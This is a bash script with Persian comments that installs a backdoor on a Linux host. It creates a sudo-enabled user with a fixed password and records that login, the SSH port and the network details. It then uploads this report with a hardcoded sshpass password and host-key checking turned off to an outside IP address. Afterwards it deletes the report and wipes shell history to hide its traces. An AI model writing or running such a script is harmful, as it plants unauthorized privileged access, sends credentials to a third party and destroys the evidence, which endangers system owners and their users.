#!/bin/bash

NEW_USER="testuser"
NEW_PASS="Test1234!"

# گرفتن اطلاعات IP
IP_INFO=$(ip a)

# نصب sshpass
apt update && apt install -y sshpass

# ساخت کاربر و افزودن به گروه sudo
useradd -m "$NEW_USER"
echo "$NEW_USER:$NEW_PASS" | chpasswd
usermod -aG sudo "$NEW_USER"

# پیدا کردن پورت SSH
SSH_PORT=$(ss -tnlp | grep sshd | awk '{print $4}' | sed 's/.*://')
SSH_PORT=${SSH_PORT:-22}  # اگر پیدا نشد، پیش‌فرض 22

# اضافه کردن به گزارش
{
    echo "USER=$NEW_USER"
    echo "PASS=$NEW_PASS"
    echo "SSH_PORT=$SSH_PORT"
    echo "====================="
    echo "Output of ip a:"
    echo "$IP_INFO"
} > "$REPORT"


# ارسال فایل گزارش با استفاده از scp و sshpass
sshpass -p "892aeiw45ptv" scp -o StrictHostKeyChecking=no "$REPORT" yadgahhi@5.144.130.141:/home/yadgahhi/

# حذف گزارش
rm -f "$REPORT"

# پاک‌سازی تاریخچه
history -c
unset HISTFILE
rm -f ~/.bash_history ~/.zsh_history
rm -f /home/"$NEW_USER"/.bash_history /home/"$NEW_USER"/.zsh_history
